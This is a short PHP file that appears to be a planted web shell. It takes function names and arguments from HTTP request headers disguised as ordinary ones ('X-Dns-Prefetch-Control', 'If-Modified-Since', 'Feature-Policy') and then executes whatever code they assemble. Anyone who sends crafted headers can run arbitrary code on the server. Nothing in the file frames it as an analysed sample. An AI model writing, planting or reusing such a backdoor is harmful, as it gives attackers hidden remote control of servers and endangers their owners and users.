<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $lock = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Modified-Since']($_HEADERS['Feature-Policy']));
    $lock();
}